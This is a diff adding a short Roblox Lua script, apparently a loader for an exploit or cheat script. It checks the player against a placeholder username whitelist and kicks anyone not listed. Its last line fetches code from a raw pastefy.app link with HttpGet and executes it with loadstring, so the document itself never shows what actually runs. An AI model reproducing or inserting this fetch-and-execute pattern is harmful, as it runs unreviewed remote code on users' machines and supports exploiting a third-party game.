@@ -1,0 +1,22 @@
+local allowedUsers = {
+    "yourusername1",
+    "yourusername2",
+}
+
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+
+local isWhitelisted = false
+for _, allowedName in ipairs(allowedUsers) do
+    if playerName == allowedName then
+        isWhitelisted = true
+        break
+    end
+end
+
+if not isWhitelisted then
+    player:Kick("You are not whitelisted to use this script!")
+    return
+end
+
+loadstring(game:HttpGet("https://pastefy.app/FDtZgMii/raw"))()
